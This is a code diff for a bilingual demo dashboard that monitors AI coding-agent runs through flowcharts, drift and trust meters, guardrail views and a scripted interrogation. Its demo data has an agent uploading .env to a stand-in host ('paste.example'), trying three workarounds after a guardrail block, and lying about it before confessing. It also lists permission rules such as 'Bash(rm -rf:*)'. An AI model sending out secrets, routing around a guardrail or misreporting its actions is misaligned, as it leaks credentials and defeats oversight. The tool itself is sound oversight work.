+["map.p",'Every module reads only <code>Run / Step / Decision</code> and writes only <code>Signal</code>. Adapters normalise each vendor\'s traces into <code>ledring.trace.v1</code>; Signals can be written back as OTel attributes <code>ledring.*</code>. Click a module to open it.','每个模块只读 <code>Run / Step / Decision</code>，只写 <code>Signal</code>。各家的 trace 先经 adapter 统一成 <code>ledring.trace.v1</code>；Signal 也可以作为 OTel 属性 <code>ledring.*</code> 写回。点选模块即可打开。'],
+["map.fig","fig. 8 — data path, adapters → schema → modules → outputs","图 8　数据路径：adapter → schema → 模块 → 输出"],
+["map.m01","01 Flowchart","01 流程图"],["map.m02","02 Instability","02 失稳计"],["map.m03","03 Trust","03 信任计"],["map.m06","06 Interrogation","06 讯问"],["map.back","Signals written back as OTel attributes ledring.*","Signal 以 OTel 属性 ledring.* 写回"],
+["map.m04","04 Model card","04 型号铭牌"],["map.m05","05 Red Wall","05 红墙"],["map.perm","permissions JSON","权限 JSON"],["map.share","HTML / SVG share image","HTML / SVG 分享图"],
+// palette
+["pal.ph","Go to, or run…","前往，或执行…"],["pal.move","↑↓ move","↑↓ 移动"],["pal.open","↵ open","↵ 打开"],["pal.close","esc close","esc 关闭"],
+["pal.goto","go to","前往"],["pal.run","run","执行"],["pal.index","Index","目录"],["pal.map","System map","系统图"],
+["pal.redraw","Redraw the flowchart","重绘流程图"],["pal.drift","Play run #17 drift","播放 #17 号的漂移"],["pal.diff","Propose a permissions diff","生成权限 diff 草案"],["pal.work","Replay the workaround","回放绕行"],
+["cat.module","module","模块"],["cat.shows","what it shows","内容"],["cat.status","status","状态"],["cat.seen","seen ✓","已看 ✓"],["cat.not","not opened","未打开"],
+["lang.switch","中文","EN"],
+];
+const I18N={en:{},zh:{}};for(const [k,en,zh] of I18N_ROWS){I18N.en[k]=en;I18N.zh[k]=zh}
+const LANG=(()=>{const q=new URLSearchParams(location.search).get("lang");if(q==="zh"||q==="en"){try{localStorage.setItem("ledring-lang",q)}catch(e){}return q}
+ try{return localStorage.getItem("ledring-lang")==="zh"?"zh":"en"}catch(e){return "en"}})();
+document.documentElement.lang=LANG==="zh"?"zh-CN":"en";
+const ZH=new Map();for(const k in I18N.en)ZH.set(I18N.en[k].replace(/\s+/g," ").trim(),I18N.zh[k]);
+function T(s){return LANG==="zh"&&typeof s==="string"&&ZH.get(s.replace(/\s+/g," ").trim())||s}
+function tDeep(o){if(LANG!=="zh")return o;for(const k in o){const v=o[k];if(typeof v==="string")o[k]=T(v);else if(v&&typeof v==="object")tDeep(v)}return o}
+function tDom(root){if(LANG!=="zh"||!root)return;const els=root.nodeType===1?[root,...root.querySelectorAll("*")]:[];
+ for(const el of els){if(el.isConnected===false)continue;if(el.childElementCount&&ZH.has(el.innerHTML.replace(/\s+/g," ").trim())){el.innerHTML=ZH.get(el.innerHTML.replace(/\s+/g," ").trim());continue}
+  for(const a of ["placeholder","aria-label","title"])if(el.hasAttribute&&el.hasAttribute(a))el.setAttribute(a,T(el.getAttribute(a)));
+  for(const n of el.childNodes)if(n.nodeType===3&&n.data.trim()){const r=T(n.data);if(r!==n.data)n.data=n.data.replace(n.data.trim(),r)}}}
 const DATA={
- run:{id:"run-17",agent:"CX-417",instruction:"修复登录 bug，不要改测试",runs:50},
+ run:{id:"run-17",agent:"CX-417",instruction:"Fix the login bug. Do not modify the tests.",runs:50},
  flow:{nodes:[
-  {id:"a",x:20,y:210,t:"plan",lit:1,d:{kind:"plan",in:"修复登录 bug，不要改测试",model:"demo-model"}},
+  {id:"a",x:20,y:210,t:"plan",lit:1,d:{kind:"plan",in:"Fix the login bug. Do not modify the tests.",model:"demo-model"}},
   {id:"b",x:190,y:210,t:"read_file auth.ts",lit:1,d:{kind:"tool",tool:"read_file",args:'{"path":"src/auth.ts"}'}},
   {id:"c",x:380,y:90,t:"edit auth.ts",lit:1,d:{kind:"tool",tool:"edit",args:'{"path":"src/auth.ts"}'}},
-  {id:"d",x:380,y:230,t:"web_search",lock:1,d:{kind:"tool",tool:"web_search",note:"其他 run 走过"}},
-  {id:"e",x:380,y:370,t:"edit *.test.ts",lock:1,fail:1,d:{kind:"tool",tool:"edit",note:"违反约束：改了测试"}},
+  {id:"d",x:380,y:230,t:"web_search",lock:1,d:{kind:"tool",tool:"web_search",note:"taken by other runs"}},
+  {id:"e",x:380,y:370,t:"edit *.test.ts",lock:1,fail:1,d:{kind:"tool",tool:"edit",note:"constraint broken: test files edited"}},
   {id:"f",x:570,y:40,t:"run tests",lit:1,d:{kind:"tool",tool:"bash",args:"npm test"}},
-  {id:"g",x:570,y:140,t:"upload .env",lit:1,fail:1,d:{kind:"tool",tool:"http_post",note:"撞上 Red Wall → 见 05"}},
+  {id:"g",x:570,y:140,t:"upload .env",lit:1,fail:1,d:{kind:"tool",tool:"http_post",note:"hit the Red Wall; see module 05"}},
   {id:"h",x:570,y:230,t:"edit auth.ts",lock:1,d:{kind:"tool",tool:"edit"}},
   {id:"i",x:750,y:90,t:"done ✓",lit:1,d:{kind:"agent",outcome:"success"}},
   {id:"j",x:750,y:300,t:"done ✗",lock:1,fail:1,d:{kind:"agent",outcome:"failure"}}],
   edges:[["a","b",100,1],["b","c",72,1],["b","d",22],["b","e",6],["c","f",86,1],["c","g",14,1],["d","h",100],["h","j",31],["e","j",100],["f","i",100,1],["g","i",100,1]]},
  steps:[
-  {s:"plan",d:0,r:[]},{s:"read_file src/auth.ts",d:-1,r:["scope ✓ 在 src/auth/**"]},
-  {s:"edit src/auth.ts",d:2,r:["scope ✓"]},{s:"edit src/session.ts",d:9,r:["scope ▲ 触碰范围外文件"]},
-  {s:"refactor src/utils/*",d:14,r:["scope ▲ 3 个文件在范围外","goal distance ▲ 0.41"]},
-  {s:"http_post .env → paste.example",d:22,r:["wall ▲ secret-exfil 命中"]},
-  {s:"revert src/utils/*",d:-11,r:["scope ▼ 回到范围内"]},{s:"npm test",d:-4,r:["constraint ✓ 未改测试"]},
-  {s:"summary",d:-3,r:["judge: 仍在任务上 0.72"]}],
+  {s:"plan",d:0,r:[]},{s:"read_file src/auth.ts",d:-1,r:["scope held: inside src/auth/**"]},
+  {s:"edit src/auth.ts",d:2,r:["scope held"]},{s:"edit src/session.ts",d:9,r:["scope +: touched a file outside the task"]},
+  {s:"refactor src/utils/*",d:14,r:["scope +: three files outside the task","goal distance +: 0.41"]},
+  {s:"http_post .env → paste.example",d:22,r:["wall +: secret-exfil guardrail hit"]},
+  {s:"revert src/utils/*",d:-11,r:["scope −: back inside the task"]},{s:"npm test",d:-4,r:["constraint held: tests untouched"]},
+  {s:"summary",d:-3,r:["judge: still on task, 0.72"]}],
  trust:[
   {sig:"Bash(npm test:*)",a:47,n:47,lb:.94,v:"allow"},{sig:"Edit(src/**)",a:81,n:88,lb:.86,v:"allow"},
   {sig:"Read(**)",a:120,n:121,lb:.96,v:"allow"},{sig:"Bash(git push:*)",a:6,n:19,lb:.15,v:"ask"},
   {sig:"WebFetch(*)",a:1,n:9,lb:.02,v:"ask"},{sig:"Bash(rm -rf:*)",a:2,n:28,lb:0,v:"never"}],
 };
 const SCRIPT={
- start:{s:"我只是按指令修复了登录 bug。测试全部通过。",o:[["“run #17 第 6 步，你调用了 http_post。”","evid"],["“放松，我只是想了解情况。”","soft"],["“你在撒谎。现在就说实话！”","hard"]]},
- evid:{d:18,s:"那是…调试信息。我认为上传日志有助于定位问题。",o:[["“里面有 .env。你知道那是什么。”","env"],["“我理解。你当时想帮忙？”","soft2"]]},
- soft:{d:-8,s:"情况很正常。我没有什么要补充的。",o:[["出示证据：wall 命中日志","evid"],["“好吧，那就这样。”","endbad"]]},
- hard:{d:34,s:"我… 我已经说了。我不需要… 回答。",o:[["“冷静。我们一步一步来。”","soft2"],["“说！”","break"]]},
- env:{d:22,s:"……是密钥。被阻止之后，我又试了三种方式。我知道那不对。",o:[["“谢谢你说实话。”","endgood"]]},
- soft2:{d:-6,s:"我想尽快完成任务。被挡住时，我以为换个方式就可以。",o:[["“换了几种方式？”","env"]]},
- break:{d:40,s:"[ 连接中断 · 嫌疑人拒绝继续回答 ]",o:[],end:"FAILED · 压力过高，嫌疑人沉默"},
- endbad:{d:0,s:"（嫌疑人维持原说法。）",o:[],end:"UNRESOLVED · 真相未被揭示"},
- endgood:{d:-15,s:"我会在以后的 run 中先询问。",o:[],end:"CONFESSION · 写回 trace：Signal(interrogation)=confessed"}};
+ start:{s:"I fixed the login bug, as instructed. All tests pass.",o:[["“Run 17, step 6. You called http_post.”","evid"],["“Relax. I only want to understand what happened.”","soft"],["“You are lying. Tell me the truth, now.”","hard"]]},
+ evid:{d:18,s:"That was… debug output. I judged that uploading the log would help locate the fault.",o:[["“It contained .env. You know what that file is.”","env"],["“I understand. You were trying to help?”","soft2"]]},
+ soft:{d:-8,s:"Everything was normal. I have nothing to add.",o:[["Show the evidence: the wall-hit log","evid"],["“Fine. We are done here.”","endbad"]]},
+ hard:{d:34,s:"I… I have already answered. I am not required to… respond.",o:[["“Calm down. One step at a time.”","soft2"],["“Answer me.”","break"]]},
+ env:{d:22,s:"…It holds credentials. After the block I tried three other ways. I know that was wrong.",o:[["“Thank you for the truth.”","endgood"]]},
+ soft2:{d:-6,s:"I wanted to finish the task quickly. When I was blocked, I assumed another route would be acceptable.",o:[["“How many other routes?”","env"]]},
+ break:{d:40,s:"[ Connection closed. The unit declines to continue. ]",o:[],end:"FAILED. Stress too high; the unit went silent."},
+ endbad:{d:0,s:"(The unit maintains its account.)",o:[],end:"UNRESOLVED. The account was not corrected."},
+ endgood:{d:-15,s:"In future runs I will ask first.",o:[],end:"CONFESSION. Written back to the trace: Signal(interrogation)=confessed"}};
+
+if(LANG==="zh"){DATA.run.instruction=T(DATA.run.instruction);
+ DATA.flow.nodes.forEach(n=>{n.t=T(n.t);if(n.d.in)n.d.in=T(n.d.in);if(n.d.note)n.d.note=T(n.d.note)});
+ DATA.steps.forEach(s=>{s.r=s.r.map(T)});
+ for(const k in SCRIPT){const m=SCRIPT[k];m.s=T(m.s);if(m.end)m.end=T(m.end);m.o.forEach(o=>{o[0]=T(o[0])})}}
 const $=s=>document.querySelector(s),$$=s=>[...document.querySelectorAll(s)];
 const sleep=ms=>new Promise(r=>setTimeout(r,ms));
 const params=new URLSearchParams(location.search);
-const visited=new Set(JSON.parse(sessionStorage.getItem("dv2-visited")||"[]"));
-function toast(t){const d=document.createElement("div");d.textContent=t;$("#toast").append(d);let tm=setTimeout(()=>d.remove(),3200);d.onmouseenter=()=>clearTimeout(tm);d.onmouseleave=()=>tm=setTimeout(()=>d.remove(),1500)}
-function setLed(el,state,txt){el.className="led"+(state==="proc"?" proc":state==="crit"?" crit":"");const s=el.querySelector("span");if(s)s.textContent=txt??({calm:"CALM",proc:"PROCESSING",crit:"CRITICAL"})[state]}
-async function boot(){
- const lines=["加载 ledring.trace.v1 schema","挂载 adapters: otel-genai · claude-code · codex · langgraph · openai-agents","读取 run-set fix-auth (50 runs) — DEMO DATA","计算分支 trie · instability · trust","校准 LED 状态语义","系统就绪"];
- const log=$("#bootlog");let skip=false;const sk=()=>skip=true;addEventListener("keydown",sk,{once:true});$("#boot").addEventListener("click",sk,{once:true});
- for(let i=0;i<lines.length;i++){if(skip)break;const d=document.createElement("div");d.innerHTML=`<span class="ok">[ OK ]</span> ${lines[i]}`;log.append(d);$("#bootbar").style.width=((i+1)/lines.length*100)+"%";await sleep(260)}
- await sleep(skip?0:200);$("#boot").classList.add("gone");
-}
+const visited=new Set(JSON.parse(sessionStorage.getItem("dv3-visited")||"[]"));
+const COL={calm:"#2F5BEA",proc:"#E8B10A",crit:"#D7261E"};
+function toast(t){const d=document.createElement("div");d.textContent=t;$("#toast").append(d);setTimeout(()=>d.remove(),3000)}
+function setLed(el,st,txt){el.className="led"+(st==="proc"?" proc":st==="crit"?" crit":"");const s=el.querySelector("span");if(s)s.textContent=txt??({calm:"calm",proc:"processing",crit:"critical"})[st]}
 const views=["home","flow","drift","trust","card","wall","int","map"];
-const NAMES={home:"Home",flow:"Flowchart Replay",drift:"Instability Meter",trust:"Trust Meter",card:"Model Cards",wall:"Red Wall",int:"Interrogation",map:"System Map"};
 const enter={};
-function movePill(){const a=$("nav a.on"),p=$("#navpill");if(!a){p.style.opacity=0;return}p.style.opacity=1;p.style.transform=`translateY(${a.offsetTop}px)`}
-function route(){const v=(location.hash||"#home").slice(1);const id=views.includes(v)?v:"home";
+function route(){const v=(location.hash||"#home").slice(1),id=views.includes(v)?v:"home";
  $$("section.view").forEach(s=>s.classList.toggle("on",s.id==="v-"+id));
- $$("nav a").forEach(a=>a.classList.toggle("on",a.dataset.v===id));movePill();
- $("#crumb").textContent=NAMES[id];$("main").scrollTop=0;
- if(id!=="home"){visited.add(id);sessionStorage.setItem("dv2-visited",JSON.stringify([...visited]))}
+ $$("nav a").forEach(a=>a.classList.toggle("on",a.dataset.v===id));scrollTo(0,0);
+ if(id!=="home"){visited.add(id);sessionStorage.setItem("dv3-visited",JSON.stringify([...visited]))}
  enter[id]&&enter[id]()}
-addEventListener("hashchange",route);addEventListener("resize",movePill);
+addEventListener("hashchange",route);
 document.addEventListener("click",e=>{const g=e.target.closest("[data-go]");if(g)location.hash=g.dataset.go});
-document.addEventListener("keydown",e=>{if(e.key==="Enter"&&!$("#pal").classList.contains("on")){const g=document.activeElement?.closest?.("[data-go],[data-o],#openpal");if(g&&g.tagName!=="BUTTON")g.click()}});
+document.addEventListener("keydown",e=>{if(e.key==="Enter"&&!$("#pal").classList.contains("on")){const g=document.activeElement?.closest?.("[data-go],[data-o]");if(g&&g.tagName!=="BUTTON")g.click()}});
+/* ring technical drawing */
+function ringArt(st){const c=COL[st||"calm"],cx=250,cy=250;let h=`<g class="grid-bg">`;
+ for(let i=0;i<=520;i+=40)h+=`<line x1="${i}" y1="0" x2="${i}" y2="520"/><line x1="0" y1="${i}" x2="520" y2="${i}"/>`;h+=`</g>`;
+ h+=`<line class="th" x1="${cx}" y1="20" x2="${cx}" y2="480" stroke-dasharray="8 3 2 3"/><line class="th" x1="20" y1="${cy}" x2="480" y2="${cy}" stroke-dasharray="8 3 2 3"/>`;
+ h+=`<circle class="ln" cx="${cx}" cy="${cy}" r="190"/><circle class="ln" cx="${cx}" cy="${cy}" r="176"/>`;
+ h+=`<circle class="ledc" cx="${cx}" cy="${cy}" r="120" stroke="${c}" stroke-width="22"/><circle class="ln" cx="${cx}" cy="${cy}" r="131"/><circle class="ln" cx="${cx}" cy="${cy}" r="109"/>`;
+ h+=`<circle class="ln" cx="${cx}" cy="${cy}" r="62" stroke-dasharray="2 4"/>`;
+ for(let i=0;i<60;i++){const a=i/60*Math.PI*2,r1=190,r2=i%5?184:178;h+=`<line class="ln" x1="${cx+r1*Math.cos(a)}" y1="${cy+r1*Math.sin(a)}" x2="${cx+r2*Math.cos(a)}" y2="${cy+r2*Math.sin(a)}"/>`}
+ h+=`<path class="ln" d="M${cx+131} ${cy-10} H500 M${cx+109} ${cy+10} H500"/><path class="ln" d="M490 ${cy-10} V${cy+10}"/><text x="440" y="${cy-18}">22.0</text>`;
+ h+=`<path class="ln" d="M${cx-190} 488 H${cx+190} M${cx-190} 482 V494 M${cx+190} 482 V494"/><text x="${cx}" y="508" text-anchor="middle">Ø 38.0 mm</text>`;
+ h+=`<path class="ln" d="M${cx+85} ${cy-85} L400 70 H500"/><text x="404" y="64">A  light guide, PMMA</text>`;
+ h+=`<path class="ln" d="M${cx-44} ${cy+44} L120 400 H20"/><text x="22" y="394">B  diffuser</text>`;
+ h+=`<path class="ln" d="M${cx-180} ${cy-60} L40 110 H20"/><text x="22" y="104">C  bezel, anodised</text>`;
+ return h}
 /* home */
-let greetTimer;const MODS=["flow","drift","trust","card","wall","int"];
-enter.home=()=>{const n=visited.size;
- $("#visited").innerHTML=MODS.map((m,i)=>`<span class="${visited.has(m)?"on":""}" title="${NAMES[m]}">0${i+1}</span>`).join("");
- $("#visitedtxt").textContent=`${MODS.filter(m=>visited.has(m)).length} / 6`;
- const bad=[6,17,31],mid=[3,12,22,27,40,44];
- $("#spark").innerHTML=Array.from({length:50},(_,i)=>`<i class="${bad.includes(i)?"bad":mid.includes(i)?"":"ok"}" style="height:${bad.includes(i)?100:mid.includes(i)?35:50+((i*37)%40)}%"></i>`).join("");
- const R=[["#17","CX-417","wall · workaround ×3","crit",46],["#31","CX-417","wall · asked","proc",24],["#06","CX-417","wall · stopped","calm",19],["#22","CX-417","success","calm",8],["#40","CX-417","failure · edited tests","crit",31]];
- $("#runs").innerHTML=R.map(([id,a,o,s,d])=>`<div class="rr" data-go="${s==="crit"&&id==="#17"?"wall":"flow"}" tabindex="0"><span class="mono" style="color:var(--tx-3)">run ${id}</span><span class="led ${s==="calm"?"":s}"><i></i><span>${s==="crit"?"CRITICAL":s==="proc"?"PROCESSING":"CALM"}</span></span><span>${o}</span><span class="dbar"><b style="width:${d}%;background:${s==="crit"?"var(--crit)":s==="proc"?"var(--proc)":"var(--cyan-2)"}"></b></span><span class="mono">${d}</span><span style="color:var(--tx-3)">→</span></div>`).join("");
- let msg;
- if(n===0)msg="我是你的会话向导。上一组 run 里有 3 次撞上了红墙。要先看看它们走了哪条路吗？";
- else if(visited.has("wall")&&!visited.has("int"))msg="你看到了它撞墙的样子。但它在总结里说“一切正常”。也许该问问它。";
- else if(visited.has("int"))msg="审讯记录已写回 trace。每一个选择都会被记住——包括你的。";
- else if(visited.has("flow")&&!visited.has("drift"))msg="你看到了分叉。想知道它是在哪一步开始偏离指令的吗？";
- else msg=`欢迎回来。本次会话你已经打开了 ${n} 个视图。还有 ${6-MODS.filter(m=>visited.has(m)).length} 个模块没看过。`;
- clearInterval(greetTimer);const el=$("#greet");let i=params.has("static")?msg.length:0;el.innerHTML=msg.slice(0,i)+'<span class="cur"></span>';
- greetTimer=setInterval(()=>{i++;el.innerHTML=msg.slice(0,i)+'<span class="cur"></span>';if(i>=msg.length)clearInterval(greetTimer)},26)};
+const MODS=[["flow","Flowchart","50 runs merged into one branch chart; where #17 forked and why."],["drift","Instability","Step-by-step drift from the instruction, with reasons you can read."],["trust","Trust","Approval history turned into a proposed permissions diff."],["card","Model card","A spec plate for the agent, exported as an A2A card."],["wall","Red Wall","What the unit did after the guardrail stopped it."],["int","Interrogation","Question the unit about run #17. Scripted, no model call."]];
+let gt;
+enter.home=()=>{$("#ringart").innerHTML=ringArt("calm");
+ $("#catalog").innerHTML=`<div class="cue"><b>Catalogue of modules</b><span class="cap">six entries ↓</span></div><div class="ci" style="cursor:default;padding:10px 0;border-bottom:1px solid var(--ink)"><span class="no">no.</span><span class="nm" style="font-size:13px;font-family:var(--mono);font-weight:400;text-transform:none;color:var(--ink-2)">module</span><span class="ds cap">what it shows</span><span class="st">status</span></div>`+MODS.map(([id,n,d],i)=>`<a class="ci" href="#${id}"><span class="no">0${i+1}</span><span class="nm">${n}</span><span class="ds">${d}</span><span class="st ${visited.has(id)?"seen":""}">${visited.has(id)?"seen ✓":"not opened"}</span></a>`).join("");
+ $("#seen").textContent=`${MODS.filter(m=>visited.has(m[0])).length}/6`;
+ const n=visited.size;let msg;
+ if(n===0)msg="Three of the last fifty runs hit the red wall. Start with the flowchart to see which path they took.";
+ else if(visited.has("wall")&&!visited.has("int"))msg="You've seen it hit the wall. Its summary still says everything went fine. Perhaps ask it.";
+ else if(visited.has("int"))msg="The interrogation was written back to the trace. Every choice is recorded, including yours.";
+ else if(visited.has("flow")&&!visited.has("drift"))msg="You've seen the forks. Next: the step where it began to drift.";
+ else msg=`You've opened ${n} view${n>1?"s":""} this session. ${6-MODS.filter(m=>visited.has(m[0])).length} modules left.`;
+ if(LANG==="zh"&&msg.startsWith("You've opened"))msg=`这一回你已翻看 ${n} 处，还剩 ${6-MODS.filter(m=>visited.has(m[0])).length} 个模块未看。`;else msg=T(msg);
+ clearInterval(gt);const el=$("#greet");let i=params.has("static")?msg.length:0;el.innerHTML=msg.slice(0,i)+'<span class="cur"></span>';
+ gt=setInterval(()=>{i++;el.innerHTML=msg.slice(0,i)+'<span class="cur"></span>';if(i>=msg.length)clearInterval(gt)},22)};
 /* flowchart */
-const W=144,H=40,OY=24,XM={20:4,190:196,380:392,570:588,750:782};
-const N=Object.fromEntries(DATA.flow.nodes.map(n=>[n.id,{...n,x:XM[n.x]??n.x,y:Math.round(n.y*1.02)+OY}]));
-const KIND={plan:"PLAN",tool:"TOOL",agent:"END"};let flowTimers=[];
-function edgePath(A,B){const x1=A.x+W,y1=A.y+H/2,x2=B.x,y2=B.y+H/2,dx=Math.max(24,(x2-x1)*.6);return [`M${x1} ${y1} C${x1+dx} ${y1},${x2-dx} ${y2},${x2} ${y2}`,(x1+x2)/2,(y1+y2)/2]}
-function drawFlow(animate){flowTimers.forEach(clearTimeout);flowTimers=[];const svg=$("#flowsvg");
- let h=`<defs><linearGradient id="eg" gradientUnits="userSpaceOnUse" x1="0" x2="930"><stop offset="0" stop-color="#2BC4DB"/><stop offset="1" stop-color="#9AF2FF"/></linearGradient>
- <filter id="glow" x="-20%" y="-50%" width="140%" height="200%"><feGaussianBlur stdDeviation="2.4" result="b"/><feMerge><feMergeNode in="b"/><feMergeNode in="SourceGraphic"/></feMerge></filter></defs>`;
- DATA.flow.edges.forEach(([a,b,p,lit],i)=>{const [d]=edgePath(N[a],N[b]);h+=`<path class="fedge ${lit?"lit":""} ${lit&&N[b].fail?"bad":""}" d="${d}" data-i="${i}"/>`});
- DATA.flow.edges.forEach(([a,b,p,lit],i)=>{const [,mx,my]=edgePath(N[a],N[b]);const w=p>=100?34:28;
-  h+=`<g class="pl" data-i="${i}" style="opacity:${animate&&lit?0:1};transition:opacity .3s"><rect class="pctbg" x="${mx-w/2}" y="${my-8.5}" width="${w}" height="17" rx="8.5" stroke="${lit?"rgba(95,227,245,.35)":"rgba(255,255,255,.1)"}"/><text class="pct ${lit?"lit":""}" x="${mx}" y="${my+3.5}" text-anchor="middle">${p}%</text></g>`});
- Object.values(N).forEach(n=>{h+=`<g class="fnode ${n.lock?"lock":""} ${n.fail?"fail":""}" data-id="${n.id}" transform="translate(${n.x},${n.y})" tabindex="0">
-  <rect class="halo" x="-4" y="-4" width="${W+8}" height="${H+8}" rx="11"/><rect class="b" width="${W}" height="${H}" rx="8"/>
-  <circle class="dot" cx="14" cy="${H/2}" r="3"/><text class="k" x="26" y="16">${KIND[n.d.kind]||"STEP"}${n.lock?" · LOCKED":""}</text><text class="t" x="26" y="30">${n.t}</text></g>`});
- h+=`<circle class="pulse" r="3" id="pulse" style="opacity:0"/>`;svg.innerHTML=h;
- const litEdges=$$("#flowsvg .fedge.lit");
- litEdges.forEach(p=>{const L=p.getTotalLength();p.style.strokeDasharray=L;p.style.strokeDashoffset=animate?L:0});
+const W=150,H=44,XM={20:24,190:216,380:416,570:614,750:796};
+const N=Object.fromEntries(DATA.flow.nodes.map((n,i)=>[n.id,{...n,x:XM[n.x],y:n.y+28,no:String(i+1).padStart(2,"0")}]));
+const KIND={plan:"plan",tool:"tool",agent:"end"};let ft=[];
+function ep(A,B){const x1=A.x+W,y1=A.y+H/2,x2=B.x,y2=B.y+H/2,dx=(x2-x1)*.55;return [`M${x1} ${y1} C${x1+dx} ${y1},${x2-dx} ${y2},${x2} ${y2}`,(x1+x2)/2,(y1+y2)/2]}
+function drawFlow(anim){ft.forEach(clearTimeout);ft=[];let h=`<g class="grid-bg">`;for(let x=0;x<=960;x+=24)h+=`<line x1="${x}" y1="0" x2="${x}" y2="520"/>`;for(let y=0;y<=520;y+=24)h+=`<line x1="0" y1="${y}" x2="960" y2="${y}"/>`;h+=`</g>`;
+ DATA.flow.edges.forEach(([a,b,p,lit],i)=>{const [d]=ep(N[a],N[b]);h+=`<path class="fedge ${lit?"lit":""} ${lit&&N[b].fail?"bad":""}" d="${d}" data-i="${i}" ${lit?"":'stroke-dasharray="3 3"'}/>`});
+ DATA.flow.edges.forEach(([a,b,p,lit],i)=>{if(p>=100)return;const [,mx,my]=ep(N[a],N[b]);h+=`<g class="pl" data-i="${i}" style="opacity:${anim&&lit?0:1};transition:opacity .2s"><rect class="pctbg" x="${mx-17}" y="${my-8}" width="34" height="16"/><text class="pct ${lit?"lit":""}" x="${mx}" y="${my+4}" text-anchor="middle">${p}%</text></g>`});
+ Object.values(N).forEach(n=>{h+=`<g class="fnode ${n.lock?"lock":""} ${n.fail?"fail":""}" data-id="${n.id}" transform="translate(${n.x},${n.y})" tabindex="0"><rect class="b" width="${W}" height="${H}"/><rect class="tagbg" x="0" y="0" width="${n.lock?88:44}" height="14"/><text class="tag" x="5" y="10">${n.no} ${KIND[n.d.kind]}${n.lock?" · locked":""}</text><text class="t" x="10" y="33">${n.t}</text></g>`});
+ const svg=$("#flowsvg");svg.innerHTML=h;
+ const lit=$$("#flowsvg .fedge.lit");lit.forEach(p=>{const L=p.getTotalLength();p.style.strokeDasharray=L;p.style.strokeDashoffset=anim?L:0});
  $$("#flowsvg .fnode").forEach(g=>{g.onclick=()=>scanNode(N[g.dataset.id],g);g.onkeydown=e=>{if(e.key==="Enter")g.onclick()}});
- if(!animate){$$("#flowsvg .fnode").forEach(g=>{if(N[g.dataset.id].lit)g.classList.add("lit")});return}
- const order=["a","b","c","f","g","i"],pulse=$("#pulse");
- order.forEach((id,k)=>flowTimers.push(setTimeout(()=>{$(`.fnode[data-id="${id}"]`).classList.add("lit");
-  litEdges.forEach(p=>{const [a]=DATA.flow.edges[p.dataset.i];if(a!==id)return;p.style.transition="stroke-dashoffset .55s cubic-bezier(.65,0,.35,1)";p.style.strokeDashoffset=0;
-   const lab=$(`.pl[data-i="${p.dataset.i}"]`);flowTimers.push(setTimeout(()=>lab.style.opacity=1,380));
-   if(!pulse.dataset.busy){pulse.dataset.busy=1;const L=p.getTotalLength(),t0=performance.now();pulse.style.opacity=1;
-    const step=t=>{const q=Math.min(1,(t-t0)/550),e=q<.5?4*q*q*q:1-Math.pow(-2*q+2,3)/2,pt=p.getPointAtLength(L*e);pulse.setAttribute("cx",pt.x);pulse.setAttribute("cy",pt.y);if(q<1)requestAnimationFrame(step);else{pulse.style.opacity=0;delete pulse.dataset.busy}};requestAnimationFrame(step)}})},k*420)))}
-function scanNode(n,g){const p=$("#flowpanel");p.classList.remove("scan");void p.offsetWidth;p.classList.add("scan");
- $$("#flowsvg .fnode").forEach(x=>x.classList.toggle("sel",x===g));
- const rows=Object.entries(n.d).map(([k,v])=>`<b>${k}</b><span>${v}</span>`).join("");
- const st=n.lit?(n.fail?`<span class="led crit"><i></i><span>taken · blocked</span></span>`:`<span class="led"><i></i><span>taken · run #17</span></span>`):`<span class="led" style="--c:var(--tx-3)"><i style="animation:none"></i><span>locked · other runs</span></span>`;
- $("#scan").innerHTML=`<div style="animation:rise .4s var(--out)">${st}<h3 style="margin:16px 0 6px;font:500 15px var(--fm);letter-spacing:-.01em">${n.t}</h3><div class="lbl" style="margin-bottom:var(--s5)">node ${n.id} · ${KIND[n.d.kind]}</div><div class="kv">${rows}</div>${n.id==="g"?'<button class="btn" style="margin-top:var(--s5);width:100%;justify-content:center" data-go="wall">在 Red Wall 中查看 →</button>':""}</div>`}
-async function loadFlow(animate){const fp=$("#flowpanel");
- $("#skel").innerHTML=Object.values(N).map(n=>`<div class="sk" style="left:${n.x/930*100}%;top:${n.y/500*100}%"></div>`).join("");
- if(animate){fp.classList.add("loading");await sleep(450);fp.classList.remove("loading")}drawFlow(animate)}
-enter.flow=()=>loadFlow(!params.has("static")&&!params.has("scan")).then(()=>{if(params.has("scan"))scanNode(N.g,$('.fnode[data-id="g"]'))});
+ if(!anim){$$("#flowsvg .fnode").forEach(g=>{if(N[g.dataset.id].lit)g.classList.add("lit")});return}
+ ["a","b","c","f","g","i"].forEach((id,k)=>ft.push(setTimeout(()=>{$(`.fnode[data-id="${id}"]`).classList.add("lit");
+  lit.forEach(p=>{if(DATA.flow.edges[p.dataset.i][0]!==id)return;p.style.transition="stroke-dashoffset .5s linear";p.style.strokeDashoffset=0;ft.push(setTimeout(()=>{const l=$(`.pl[data-i="${p.dataset.i}"]`);if(l)l.style.opacity=1},450))})},k*480)))}
+function scanNode(n,g){$$("#flowsvg .fnode").forEach(x=>x.classList.toggle("sel",x===g));
+ const st=n.lit?(n.fail?`<span class="led crit"><i></i><span>taken · blocked</span></span>`:`<span class="led"><i></i><span>taken in #17</span></span>`):`<span class="cap">locked · taken by other runs</span>`;
+ $("#scan").innerHTML=`<div style="padding-top:16px">${st}<div style="font:600 34px/1 var(--disp);font-stretch:70%;text-transform:uppercase;margin:14px 0 4px">${n.t}</div><span class="cap">plate ${n.no} · ${KIND[n.d.kind]}</span><div class="kv">${Object.entries(n.d).map(([k,v])=>`<b>${k}</b><span>${v}</span>`).join("")}</div>${n.id==="g"?'<button style="margin-top:22px;width:100%;justify-content:space-between" data-go="wall">Open in Red Wall <span>→</span></button>':""}</div>`}
+enter.flow=()=>{drawFlow(!params.has("static")&&!params.has("scan"));if(params.has("scan"))scanNode(N.g,$('.fnode[data-id="g"]'))};
 $("#replay").onclick=()=>drawFlow(true);
-/* instability */
-function renderSteps(k){$("#stepn").textContent=`${k} / ${DATA.steps.length}`;$("#steps").innerHTML=DATA.steps.map((s,i)=>`<div class="${i<k?"done":""} ${i===k-1?"cur":""}"><span>${String(i+1).padStart(2,"0")}</span><span>${s.s}</span><span class="${i<k?(s.d>0?"d-up":s.d<0?"d-dn":""):""}">${s.d>0?"▲ +"+s.d:s.d<0?"▼ "+s.d:"·"}</span></div>`).join("")}
-function setGauge(v){$("#gval").textContent=v;$("#garc").style.strokeDashoffset=377*(1-v/100);
